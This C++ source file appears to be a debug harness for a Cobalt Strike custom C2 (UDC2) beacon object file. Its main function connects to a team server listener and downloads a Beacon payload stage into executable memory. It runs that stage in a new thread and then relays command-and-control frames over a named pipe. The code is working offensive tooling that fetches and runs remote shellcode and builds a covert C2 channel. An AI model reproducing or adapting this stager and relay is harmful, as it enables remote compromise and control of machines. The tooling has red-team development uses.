#include <cstdio>
#include <cstring>
#include <windows.h>
#include "../udc2.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "winhttp.lib")

extern "C" void go(char*, int);

#ifndef UDC2_DEBUG_HOST
#define UDC2_DEBUG_HOST 127.0.0.1 // SET THIS TO YOUR UDC2 LISTENER HOST (Team Server)
#endif

#ifndef UDC2_DEBUG_PORT
#define UDC2_DEBUG_PORT 3333 // SET THIS TO YOUR UDC2 LISTENER PORT
#endif

#define PAYLOAD_MAX_SIZE 512 * 1024
#define BUFFER_MAX_SIZE 1024 * 1024

#define STRINGIFY_HELPER(x) #x
#define STRINGIFY(x) STRINGIFY_HELPER(x)

// read a frame from a file
DWORD readFrame(HANDLE myHandle, char* buffer, DWORD max) {
    DWORD size = 0, temp = 0, total = 0;

    // read the 4-byte length
    ReadFile(myHandle, (char*)&size, 4, &temp, NULL);

    // read the whole thing in
    while (total < size) {
        ReadFile(myHandle, buffer + total, size - total, &temp, NULL);
        total += temp;
    }

    return size;
}

// receive a frame from a socket
DWORD recvFrame(SOCKET mySocket, char* buffer, DWORD max) {
    DWORD size = 0, total = 0, temp = 0;

    // read the 4-byte length
    recv(mySocket, (char*)&size, 4, 0);

    // read in the result
    while (total < size) {
        temp = recv(mySocket, buffer + total, size - total, 0);
        total += temp;
    }

    return size;
}

// send a frame via a socket
void sendFrame(SOCKET mySocket, char* buffer, int length) {
    send(mySocket, (char*)&length, 4, 0);
    send(mySocket, buffer, length, 0);
}

// write a frame to a file
void writeFrame(HANDLE myHandle, char* buffer, DWORD length) {
    DWORD wrote = 0;
    WriteFile(myHandle, (void*)&length, 4, &wrote, NULL);
    WriteFile(myHandle, buffer, length, &wrote, NULL);
}

/**
 * @brief The debug build allows you to test your UDC2 bof code with an actual beacon
 * while running it from inside Visual Studio so that you can easily debug it.
 * To accomplish this you must set up a debug-only UDC2 listener within your CS
 * client and update the UDC2_DEBUG_HOST and UDC2_DEBUG_PORT variables below so
 * that they point to your team server host and the port you chose for the UDC2
 * listener. This function will connect to your team server and request a beacon
 * payload from the UDC2 listener and then inject the payload into this process.
 * It will then mock how the UDC2 beacon functions.
 */
int main(int argc, char* argv[]) {
    struct sockaddr_in 	sock;
    UDC2_INFO           udc2Info = { 0 };
    WSADATA             wsaData;
    WORD                wVersionRequested;

    wVersionRequested = MAKEWORD(2, 2);
    sock.sin_family = AF_INET;
    sock.sin_addr.s_addr = inet_addr(STRINGIFY(UDC2_DEBUG_HOST));
    sock.sin_port = htons(UDC2_DEBUG_PORT);

    // initialize the udc2 bof
    go((char*)&udc2Info, 0);

    if (!udc2Info.proxyCall || !udc2Info.proxyClose) {
        printf("UDC2 functions not initialized properly.\n");
        return -1;
    }

    WSAStartup(wVersionRequested, &wsaData);

    // attempt to connect to udc2 listener
    SOCKET socketUDC2 = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(socketUDC2, (struct sockaddr*)&sock, sizeof(sock))) {
        printf(
            "Could not connect to %s:%d. Make sure you have a UDC2 debug-only listener set up.\n",
            STRINGIFY(UDC2_DEBUG_HOST),
            UDC2_DEBUG_PORT
        );
        exit(0);
    }

    // grab the correct smb beacon for our arch
#ifdef _M_X64
    sendFrame(socketUDC2, (char*)"arch=x64", 8);
#else
    sendFrame(socketUDC2, (char*)"arch=x86", 8);
#endif
    sendFrame(socketUDC2, (char*)"block=1000", 9);
    sendFrame(socketUDC2, (char*)"pipename=udc2_debug", 19);

    // request our stage
    sendFrame(socketUDC2, (char*)"debugpayload", 12); // this is only available on debug-only UDC2 listeners

    // receive our stage
    char* payload = (char*)VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    recvFrame(socketUDC2, payload, PAYLOAD_MAX_SIZE);

    closesocket(socketUDC2);

    // execute the payload stage in the current process
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID)NULL, 0, NULL);

    // connect to our Beacon named pipe
    HANDLE handleBeacon = INVALID_HANDLE_VALUE;
    while (handleBeacon == INVALID_HANDLE_VALUE) {
        Sleep(1000);
        handleBeacon = CreateFileA("\\\\.\\pipe\\udc2_debug", GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
    }

    // setup our buffers
    char* buffer = (char*)malloc(BUFFER_MAX_SIZE); // 1MB should do
    char* readBuffer = (char*)malloc(BUFFER_MAX_SIZE); // 1MB should do

    // relay frames back and forth
    while (TRUE) {
        // read from our named pipe Beacon
        DWORD read = readFrame(handleBeacon, buffer, BUFFER_MAX_SIZE);
        if (read < 0) {
            break;
        }

        // rebuild the frame so it starts with the frame length
        char* out = (char*)malloc(read + 4);
        memcpy(out, &read, sizeof(int));
        memcpy(out + sizeof(int), buffer, read);

        // invoke our udc2 proxy to relay the data and recv the response
        read = udc2Info.proxyCall(out, sizeof(int) + read, readBuffer, BUFFER_MAX_SIZE);
        free(out);
        if (read < 0)
            break;

        // write to our named pipe Beacon, adjusting for frame length since
        // the proxy call returns the full frame data from the UDC2 server
        writeFrame(handleBeacon, readBuffer + sizeof(int), read - sizeof(int));

        DWORD exitCode = 0;
        GetExitCodeThread(hThread, &exitCode);
        if (exitCode != STILL_ACTIVE) break;
    }

    udc2Info.proxyClose();
    // close our handles
    CloseHandle(handleBeacon);
    CloseHandle(hThread);
    free(readBuffer);
    free(buffer);

    return 0;
}